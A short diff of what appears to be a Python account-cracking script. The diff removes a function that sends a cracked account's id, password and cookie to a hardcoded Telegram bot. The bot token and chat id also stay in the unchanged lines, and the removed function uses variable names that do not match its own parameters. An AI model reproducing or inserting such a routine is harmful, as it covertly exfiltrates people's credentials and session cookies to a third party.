@@ -478,18 +478,6 @@ cokbrut=[]
 pwpluss,pwnya=[],[]
 kld='6528578805:AAHVqYlWkpOtrj7SZ2ySxGplrTpKdBW5eTY'
 sos='6931782492'
-def Elite(id,ps,coki):
-    try:
-        import requests
-        token = "6528578805:AAHVqYlWkpOtrj7SZ2ySxGplrTpKdBW5eTY"#Add yout token 
-        chatid = "6931782492"#Add your Chat Id
-        ok_id =str(idf+"|"+pw+"|"+kuki)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        params = {"chat_id": chatid, "text": ok_id}
-        requests.get(url, params=params)
-    except:
-        pass
-
 #»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
 #------------[ WARNA-COLOR ]--------------#
 P = '\x1b[1;97m'
